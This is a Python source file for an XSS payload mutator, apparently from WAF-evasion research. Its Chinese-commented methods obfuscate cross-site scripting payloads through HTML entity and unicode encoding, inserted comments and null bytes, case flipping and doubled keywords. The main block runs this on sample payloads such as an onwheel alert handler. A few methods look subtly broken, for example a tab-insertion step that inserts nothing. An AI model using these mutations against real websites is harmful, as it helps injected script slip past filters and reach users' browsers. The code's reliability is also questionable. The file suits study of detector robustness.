#-*- coding:utf-8 –*-


import numpy as np
import re
import random



class Xss_Manipulator(object):
    def __init__(self):
        self.dim = 0
        self.name=""

#常见免杀动作：
    # 随机字符转16进制 比如： a转换成&#x61；
    # 随机字符转10进制 比如： a转换成&#97；
    # 随机字符转10进制并假如大量0 比如： a转换成&#000097；
    # 插入注释 比如： /*abcde*/
    # 插入Tab
    # 插入回车
    # 开头插入空格 比如： /**/
    # 大小写混淆，比如判断payload中=前面是否是属性，然后大小写
    # 插入 \00 也会被浏览器忽略
    # 特殊字符编码 比如：< )

    ACTION_TABLE = {
    'charTo16': 'charTo16',
    'charTo10': 'charTo10',
    'charTo10Zero': 'charTo10Zero',
    'addComment': 'addComment',
    'addTab': 'addTab',
    'addZero': 'addZero',
    'addEnter': 'addEnter',
    'addScript': 'addScript',
    'charTocase': 'charTocase',
    'doubleScript' : 'doubleScript',
    'doubleOn' : 'doubleOn',
    'doubleHref': 'doubleHref',
    'addFakelink': 'addFakelink',
    'addChar0a' : 'addChar0a',
    'addChar0d' : 'addChar0d',
    'addComment2' : 'addComment2',
    'addBackslash' : 'addBackslash'
    }

    def charTo16(self,str,seed=None):
        #print("charTo16")
        #matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        matchObjs = re.findall(r'alert|prompt|confirm', str, re.M | re.I)
        if matchObjs:
            #print("search --> matchObj.group() : ", matchObjs)
            func_alert = matchObjs[0]
            modify_char=random.choice(func_alert)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_16=r"\\u00{}".format(hex(ord(modify_char))[2:])
            modify_func = re.sub(modify_char, modify_char_16, func_alert,count=random.randint(1,3))
            #print("modify_char %s to %s" % (modify_char,modify_char_10))
            #替换
            str=str.replace(func_alert,modify_func)

        return str

    def charTo10(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        #matchObjs = re.findall(r'alert|prompt|confirm', str, re.M | re.I)
        if matchObjs:
            #print("search --> matchObj.group() : ", matchObjs)
            modify_char=random.choice(matchObjs)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_10="&#{};".format(ord(modify_char))
            #print("modify_char %s to %s" % (modify_char,modify_char_10))
            #替换
            str=re.sub(modify_char, modify_char_10, str)

        return str

    def charTo10Zero(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #print("search --> matchObj.group() : ", matchObjs)
            modify_char=random.choice(matchObjs)
            #字符转ascii值ord(modify_char
            #modify_char_10=ord(modify_char)
            modify_char_10="&#000000{};".format(ord(modify_char))
            #print("modify_char %s to %s" % (modify_char,modify_char_10))
            #替换
            str=re.sub(modify_char, modify_char_10, str)

        return str

    def addComment(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            #modify_char_comment="{}/*a{}*/".format(modify_char,modify_char)
            modify_char_comment = "{}/*8888*/".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_comment, str)

        return str

    def addTab(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            #modify_char_tab=" {}".format(modify_char)
            modify_char_tab="{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_tab, str)

        return str

    def addZero(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_zero="\\00{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_zero, str)

        return str


    def addEnter(self,str,seed=None):
        #print("charTo10")
        matchObjs = re.findall(r'[a-qA-Q]', str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_enter="\\r\\n{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_enter, str)

        return str
    def addScript(self,str,seed=None):
        #print("addScript")
        matchObjs = re.findall(r'(([script]|(?:&#[0-9]+;)|(?:\x00)){6})',str, re.M | re.I)
        if matchObjs:
            matchObjs = re.findall(r'([script]|(?:&#[0-9]+;)|(?:\x00)){1}',str, re.M | re.I)
        if matchObjs:
            #选择替换的字符
            modify_char=random.choice(matchObjs)
            #生成替换的内容
            modify_char_enter="<script>{}".format(modify_char)

            #替换
            str=re.sub(modify_char, modify_char_enter, str)
        return str

    def charTocase(self,str,seed=None):
        #print("charTocase")
        matchObjs = re.findall(r'(\w+)=',str,re.I | re.M)
        if matchObjs:
            ##选择替换的字符
            modify_char = random.choice(matchObjs)
            # 生成替换的内容
            modify_char_enter = modify_char.upper() if modify_char.islower() else modify_char.lower()
            # 替换
            str = re.sub(modify_char, modify_char_enter, str)
        return str

    def doubleScript(self,str,seed=None):
        matchObjs = re.findall(r'(\bscript\b)',str,re.I | re.M)
        if matchObjs:
            # 替换
            str = re.sub('script', 'scscriptript', str)
        return str

    def doubleOn(self,str,seed=None):
        matchObjs = re.findall(r'on',str,re.I | re.M)
        if matchObjs:
            # 替换
            str = re.sub('on', 'oonn', str)
        return str
    def doubleHref(self,str,seed=None):
        matchObjs = re.findall(r'href',str,re.I | re.M)
        if matchObjs:
            # 替换
            str = re.sub('href', 'hrhrefef', str)
        return str

    def addFakelink(self,str,seed=None):
        matchObjs = re.findall(r'(http:\/\/)',str,re.I | re.M)
        if not matchObjs:
            str += r'//http://www.licky.com'
        return str

    def addChar0a(self,str,seed=None):
        #return str.replace(' ','\n')
        return str.replace(' ', '/')
    def addChar0d(self,str,seed=None):
        #return str.replace(' ','\r')
        return str.replace('alert', 'prompt')

    def addComment2(self,str,seed=None):
        matchObjs = re.findall(r'$\/\/',str,re.I | re.M)
        if not matchObjs:
            str += r'//'
        return str
    def addBackslash(self,str,seed=None):
        matchObjs = re.findall(r'^\\\"',str,re.I | re.M)
        if not matchObjs:
            str = r'\"' + str
        return str


    def modify(self,str, _action, seed=None):

        #print("Do action :%s" % _action)
        action_func=Xss_Manipulator().__getattribute__(_action)
        #print(_action)

        return action_func(str,seed)

    ACTION_TABLE = {
    'charTo16': 'charTo16',
    'charTo10': 'charTo10',
    'charTo10Zero': 'charTo10Zero',
    'addComment': 'addComment',
    'addTab': 'addTab',
    'addZero': 'addZero',
    'addEnter': 'addEnter',
    'addScript': 'addScript',
    'charTocase': 'charTocase',
    'doubleScript' : 'doubleScript',
    'doubleOn' : 'doubleOn',
    'doubleHref': 'doubleHref',
    'addFakelink': 'addFakelink',
    'addChar0a' : 'addChar0a',
    'addChar0d' : 'addChar0d',
    'addComment2' : 'addComment2',
    'addBackslash' : 'addBackslash'
    }

if __name__ == '__main__':
    f=Xss_Manipulator()
    # a=f.modify('<object src=1 href=1 onerror="javascript:alert(1)"></object>',"addBackslash")
    # print(a)
    #
    # b=f.modify("><h1/ondrag=confirm`1`)>DragMe</h1>","charTocase")
    # print(b)
    c = f.modify("<body onwheel=alert(1)>","charTo16")
    print(c)